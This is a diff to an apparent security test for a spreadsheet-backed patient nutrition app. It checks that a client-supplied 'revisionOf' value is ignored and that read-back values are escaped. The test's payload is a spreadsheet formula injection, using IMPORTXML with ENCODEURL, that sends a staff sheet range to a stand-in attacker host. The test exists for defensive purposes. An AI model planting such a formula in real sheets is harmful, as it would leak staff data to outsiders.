@@ -52,7 +52,9 @@ T.section('SEC-B2 · revisionOf is server-managed, and read-back values are esca
   const dt = g.session('doc@kcmh.test', 'doctor');
   g.post({ action: 'registerPatient', token: dt, isNew: true, patient: P('AB-900') });
   const payload = '=IMPORTXML("https://evil.example/c?"&ENCODEURL(JOIN(",",Staff!A2:H20)),"//a")';
-  const c = g.post({ action: 'logDailyNutrition', token: dt, sessionId: 'AB-900', entry: E({ revisionOf: payload, revisionNumber: 7 }) });
+  const c = g.post({ action: 'logDailyNutrition', token: dt, sessionId: 'AB-900', entry: E({ revisionOf: payload, revisionNumber: 7, status: 'draft' }) });
+  // A draft, so the first edit below overwrites in place: since 2026-10-29 a
+  // row stored as submitted is revised even when unpublished (Pp).
   T.ok('create ok', !!c.entryId, c);
   const row = g.rows('Daily_Log')[0];
   T.eq('client revisionOf is ignored (AK blank)', row[36], '');
